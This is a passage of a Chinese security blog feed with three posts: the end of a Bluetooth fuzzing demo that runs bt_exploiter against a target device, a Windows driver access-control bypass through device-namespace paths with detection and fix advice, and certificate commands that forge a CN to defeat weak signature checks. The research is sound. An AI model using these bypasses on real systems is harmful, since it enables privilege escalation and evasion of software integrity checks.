2）按需修改tx_pre_dissection，tx_post_dissection，rx_pre_dissection和x_post_dissection，作为一个简答的demo，可以直接return 0,以便观测蓝牙的配对过程。<br>  <img src="/2023/04/26/bluetooth-fuzz/classic_bluetooth_bt_fuzzer_demo_source.png" class title="bt exploit demo"><br>3 执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bin/bt_exploiter --list-exploits</span><br></pre></td></tr></table></figure><p>bt_exploiter将会自动编译我们的demo，并列出我们定制模块：</p><img src="/2023/04/26/bluetooth-fuzz/classic_bluetooth_bt_fuzzer_demo_list.png" class title="定制demo"><p>4 接着就可以执行我们的demo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bin/bt_exploiter --host-port=/dev/ttyUSB1 --target=b0:81:01:96:48:a5 --exploit=lzy_pair --iocap 3 --authreq 0 --bounding false</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><img src="/2023/04/26/bluetooth-fuzz/classic_bluetooth_bt_fuzzer_demo_run.png" class title="运行定制demo"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>利用ESP开发板和exploit框架，还可以定制各种协议的fuzz，而不仅限于BRAKTOOTH提供的LMP协议。由于蓝牙的规范极其复杂，而各个蓝牙设备厂商都是根据自己对蓝牙规范的理解进行开发的，所以还是可能出现各种各样的漏洞，未来仍然是一个值得继续关注投入的领域。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1 <a href="https://asset-group.github.io/disclosures/braktooth/">BRAKTOOTH: Causing Havoc on Bluetooth Link Manager</a><br>2 <a href="https://evilpan.com/2021/07/10/bluetooth-sec/">蓝牙安全与攻击案例分析</a></p>]]></content>
      
      
      <categories>
          
          <category> 模糊测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝牙 </tag>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不安全的Windows驱动配置</title>
      <link href="/2023/04/23/windows-driver-security-sal/"/>
      <url>/2023/04/23/windows-driver-security-sal/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>寻找驱动中的漏洞一直是Windows平台下进行本地提权LPE的重要途径。但是在挖掘驱动的漏洞之前，首先需要解决的一个问题：攻击者（通常是低权限的用户）如何访问该驱动？<br>通常情况下，</p><h3 id="直接可以通过CreateFile打开设备名称"><a href="#直接可以通过CreateFile打开设备名称" class="headerlink" title="直接可以通过CreateFile打开设备名称"></a>直接可以通过CreateFile打开设备名称</h3><p>造成可以直接访问驱动对原因有：<br>1）驱动安装配置文件inf里没有利用<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/sddl-for-device-objects">SDDL</a>设置合适对ACL，或者<br>2）驱动在创建设备对象时候，调用不安全的API:<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice">IoCreateDevice</a>，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)</span><br><span class="line">&#123;</span><br><span class="line">  UNICODE_STRING DeviceName, SymbolicLink,sddlString;</span><br><span class="line">  PDEVICE_OBJECT deviceObject;</span><br><span class="line">  RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\mydriver&quot;</span>);</span><br><span class="line">  RtlInitUnicodeString(&amp;SymbolicLink, <span class="string">L&quot;\\DosDevices\\mydriver&quot;</span>);</span><br><span class="line">  UNREFERENCED_PARAMETER(RegistryPath);</span><br><span class="line">  <span class="comment">//创建设备</span></span><br><span class="line">  IoCreateDevice(DriverObject, <span class="number">65535</span>, &amp;DeviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, FALSE, &amp;deviceObject);  </span><br><span class="line">  <span class="comment">//创建设备的符号连接，以便应用层可以通过该符号连接进行访问</span></span><br><span class="line">  IoCreateSymbolicLink(&amp;SymbolicLink, &amp;DeviceName);</span><br><span class="line">  <span class="comment">//IRP处理例程</span></span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = myDispatchIoctl;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_INTERNAL_DEVICE_CONTROL] = myInternalDispatchIoctl;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = myDispatchCreate;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = myDispatchClose;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_READ] = myDispatchRead;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = myDispatchWrite;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = mDispatchCleanup;</span><br><span class="line">  DriverObject-&gt;DriverUnload = myUnloadDriver;</span><br><span class="line">  <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者<br>3）驱动在创建设备对象虽然调用了安全对API:<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdmsec/nf-wdmsec-wdmlibiocreatedevicesecure">IoCreateDeviceSecure</a>，但SDDL参数配置不恰当，如NULL或者SDDL限制范围过宽</p><h3 id="利用上层应用对漏洞进行访问"><a href="#利用上层应用对漏洞进行访问" class="headerlink" title="利用上层应用对漏洞进行访问"></a>利用上层应用对漏洞进行访问</h3><p>至少有三种可能：<br>1）驱动对上层应用存在任意代码执行（低权限），或者<br>2）上层应用的逻辑漏洞，导致第三方应用可以访问驱动，或者<br>3）驱动对访问对象有校验机制，但是可被绕过。比如驱动仅仅校验了进程名，这时候可以简单通过同名进程绕过，如果驱动进行签名校验，那么攻击者还可以尝试通过进程注入方式绕过</p><h3 id="利用设备空间间接访问驱动"><a href="#利用设备空间间接访问驱动" class="headerlink" title="利用设备空间间接访问驱动"></a>利用设备空间间接访问驱动</h3><p>这也是本博客重点要介绍的一个漏洞模式</p><h2 id="安全API-IoCreateDeviceSecure的不安全使用"><a href="#安全API-IoCreateDeviceSecure的不安全使用" class="headerlink" title="安全API IoCreateDeviceSecure的不安全使用"></a>安全API IoCreateDeviceSecure的不安全使用</h2><p>一般情况下，开发者都会进行以下编码，以便对驱动对象对访问实施控制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)</span><br><span class="line">&#123;</span><br><span class="line">  UNICODE_STRING DeviceName, SymbolicLink,sddlString;</span><br><span class="line">  PDEVICE_OBJECT deviceObject;</span><br><span class="line">  RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\mydriver&quot;</span>);</span><br><span class="line">  RtlInitUnicodeString(&amp;SymbolicLink, <span class="string">L&quot;\\DosDevices\\mydriver&quot;</span>);</span><br><span class="line">  <span class="comment">//设置安全访问对SDDL，以下是最常见的配置，表示仅管理员和SYSTEM对进程可以访问</span></span><br><span class="line">  RtlInitUnicodeString(&amp;sddlString, <span class="string">L&quot;D:P(A;;GA;;;SY)(A;;GA;;;BA)&quot;</span>);</span><br><span class="line">  UNREFERENCED_PARAMETER(RegistryPath);</span><br><span class="line">  <span class="comment">//创建设备</span></span><br><span class="line">  IoCreateDeviceSecure(DriverObject, , &amp;DeviceName, FILE_DEVICE_UNKNOWN, <span class="literal">NULL</span>, FALSE, &amp;sddlString, <span class="literal">NULL</span>, &amp;deviceObject);  </span><br><span class="line">  <span class="comment">//创建设备的符号连接，以便应用层可以通过该符号连接进行访问</span></span><br><span class="line">  IoCreateSymbolicLink(&amp;SymbolicLink, &amp;DeviceName);</span><br><span class="line">  <span class="comment">//IRP处理例程</span></span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = myDispatchIoctl;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_INTERNAL_DEVICE_CONTROL] = myInternalDispatchIoctl;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = myDispatchCreate;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = myDispatchClose;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_READ] = myDispatchRead;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = myDispatchWrite;</span><br><span class="line">  DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = myDispatchCleanup;</span><br><span class="line">  DriverObject-&gt;DriverUnload = myUnloadDriver;</span><br><span class="line">  <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，开发者认为已经调用了安全的API：IoCreateDeviceSecure，同时也设置合理的SDDL：”D:P(A;;GA;;;SY)(A;;GA;;;BA)”（该SDDL表示仅仅管理员和SYSTEM有权限访问驱动），事实上，不具有管理员或者SYSTEM权限的攻击者如果直接调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hDevice = CreateFile(<span class="string">&quot;\\\\.\\Device\mydriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>会打开句柄失败，通过GetLastError()会获得错位码5,也即是拒绝访问，的确起到了访问控制的作用。但以上的IoCreateDeviceSecure调用过程中i使用了一个不安全对默认配置，导致了该访问控制可被绕过。</p><h3 id="设备命名空间"><a href="#设备命名空间" class="headerlink" title="设备命名空间"></a>设备命名空间</h3><p>根据微软对WDM（oWindows Driver Model）的<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/controlling-device-namespace-access">介绍</a>，每一个设备对象都会有一个关联的命名空间，该命名空间是设备名称为前缀的，比如以上的设备名称是“\Device\mydriver”，那么，任何以打开任何包含“\Device\mydriver”的文件，比如“\Device\mydriver\testfile”，就意味着打开了设备命名空间“\Device\mydriver”里的“testfile”的文件。对于文件系统，testfile对应一个真实文件。<br>绝大部分的驱动都同时支持打开设备对象和设备对象命名空间里的文件（哪怕该文件可能并不存在），但这个情况下，则需要仔细配置访问控制策略。</p><h3 id="驱动的访问控制"><a href="#驱动的访问控制" class="headerlink" title="驱动的访问控制"></a>驱动的访问控制</h3><p>默认情况下，当调用IoCreateDeviceSecure创建设备对象时候，上层应用尝试访问该设备对象，将会由系统根据配置的SDDL进行权限检查。但是，有一个例外：如果上层应用调用CreateFile访问设备命名空间里的文件时候，系统默认不会进行权限校验，而是交由驱动在IRP_MJ_CREATE处理例程校验，除非驱动在调用IoCreateDeviceSecure设置了参数FILE_DEVICE_SECURE_OPEN，在该情况下，系统才会进行权限校验。<br>可惜，仍然有不少厂商没有配置FILE_DEVICE_SECURE_OPEN参数，同时在IRP_MJ_CREATE处理例程没有进行任何校验，导致低权限的攻击者可以通过：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hDevice = CreateFile(<span class="string">&quot;\\\\.\\Device\mydriver\testfile&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>绕过了驱动的访问权限控制。</p><h3 id="漏洞模式检查"><a href="#漏洞模式检查" class="headerlink" title="漏洞模式检查"></a>漏洞模式检查</h3><p>对于这种驱动漏洞模式，如何挖掘？<br>1）通过逆向驱动文件，检查DriverEntry入口函数调用的IoCreateDeviceSecure是否设置了FILE_DEVICE_SECURE_OPEN，如果没有设置，则进一步检查IRP_MJ_CREATE处理例程是否有权限校验：<br>如果IrpSp-&gt;FileObject-&gt;FileName长度不是0，说明上层应用当前是打开设备命名空间里的文件而不是设备对象自身，驱动应返回fail给上层，拒绝访问。<br>否在，则意味者驱动存在了访问控制绕过的漏洞<br>2）通过DeviceTree工具检查</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1）在调用IoCreateDeviceSecure设置FILE_DEVICE_SECURE_OPEN参数，或者<br>2）IRP_MJ_CREATE处理例程检查当期是否是通过设备命名空间的文件打开，如果是，则拒绝访问。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows驱动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>签名校验绕过漏洞</title>
      <link href="/2023/04/19/signature-bypass/"/>
      <url>/2023/04/19/signature-bypass/</url>
      
        <content type="html"><![CDATA[<p>目前，应用一般都会对自研模块的文件进行签名，并在软件启动时候校验签名信息，以保证软件的完整性.一些软件厂商除了使用<a href="https://learn.microsoft.com/en-us/windows/win32/api/wintrust/nf-wintrust-winverifytrust">WinVerifyTrust</a>校验签名有效性外，还会对签名的CN字段进行校验，以便确认该文件是否是预期对证书签发（因为攻击者可能使用泄漏到网络对合法签名证书进行签名）。但是，如果仅仅通过判断CN字段是否包含特定字段，则完全可以被绕过。</p><h2 id="工具依赖"><a href="#工具依赖" class="headerlink" title="工具依赖"></a>工具依赖</h2><p>makecert.exe<br>cert2spc.exe<br>pvk2pfx.exe<br>signtool.exe<br>如果已经安装了微软对SDK，那么以上工具将会默认安装，不需要单独安装。推荐通过安装SDK方式进行安装，以避免出现依赖缺少的问题。<br>同时，为了方便使用，建议将以上工具路径添加到系统的环境变量。</p><h2 id="生成自签名的根证书"><a href="#生成自签名的根证书" class="headerlink" title="生成自签名的根证书"></a>生成自签名的根证书</h2><p>makecert.exe -sv D:\mykey.pvk -n “CN&#x3D;my company name” D:\myCert.cer -a SHA256<br>注意：如果CN字段包含特殊字符，比如英文的句号.逗号,，则需要使用转义符号\将整个CN包括起来。<br>比如，-n “CN&#x3D;&quot;XXX Co., Ltd.&quot;”<br>该命令会弹出私钥保护口令，三次</p><h2 id="创建spc文件"><a href="#创建spc文件" class="headerlink" title="创建spc文件"></a>创建spc文件</h2><p>cert2spc.exe D:\myCert.cer D:\mycet.spc</p><h2 id="将公钥和私钥合并成一个pfx格式对s证书文件"><a href="#将公钥和私钥合并成一个pfx格式对s证书文件" class="headerlink" title="将公钥和私钥合并成一个pfx格式对s证书文件"></a>将公钥和私钥合并成一个pfx格式对s证书文件</h2><p>pvk2pfx.exe -pvk D:\mykey.pvk -pi password -spc D:\mycert.spc -pfx D:\mykey.pfx -po password</p><h2 id="签署目标文件"><a href="#签署目标文件" class="headerlink" title="签署目标文件"></a>签署目标文件</h2><p>signtool.exe sign &#x2F;v &#x2F;as &#x2F;fd sha256 &#x2F;f “mykey.pfx” &#x2F;p “password” &#x2F;tr <a href="http://timestamp.digicert.com/">http://timestamp.digicert.com</a> “myfile.exe”</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinVerifyTrust </tag>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
